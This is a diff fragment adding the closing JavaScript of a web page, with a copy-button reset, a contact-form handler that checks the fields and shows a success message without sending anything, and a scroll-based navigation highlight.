+      setTimeout(() => { btn.textContent = 'COPY'; }, 2000);
+    });
+  }
+
+  /* ======== CONTACT FORM ======== */
+  function submitForm() {
+    const name = document.getElementById('f-name').value.trim();
+    const email = document.getElementById('f-email').value.trim();
+    const msg = document.getElementById('f-msg').value.trim();
+    const msgEl = document.getElementById('form-msg');
+    if (!name || !email || !msg) {
+      msgEl.textContent = '⚠ PLEASE FILL ALL REQUIRED FIELDS';
+      msgEl.style.color = 'var(--red)';
+      msgEl.style.display = 'block';
+      setTimeout(() => msgEl.style.display = 'none', 3000);
+      return;
+    }
+    msgEl.textContent = '✓ MESSAGE TRANSMITTED SUCCESSFULLY';
+    msgEl.style.color = 'var(--green)';
+    msgEl.style.display = 'block';
+    ['f-name','f-email','f-subject','f-msg'].forEach(id => document.getElementById(id).value = '');
+    setTimeout(() => msgEl.style.display = 'none', 4000);
+  }
+
+  /* ======== ACTIVE NAV HIGHLIGHT ======== */
+  const sections = document.querySelectorAll('section[id]');
+  const navAs = document.querySelectorAll('.nav-links a');
+  window.addEventListener('scroll', () => {
+    let current = '';
+    sections.forEach(s => {
+      if (window.scrollY >= s.offsetTop - 100) current = s.id;
+    });
+    navAs.forEach(a => {
+      a.style.color = a.getAttribute('href') === '#' + current ? 'var(--green)' : '';
+    });
+  });
+</script>
+</body>
+</html>
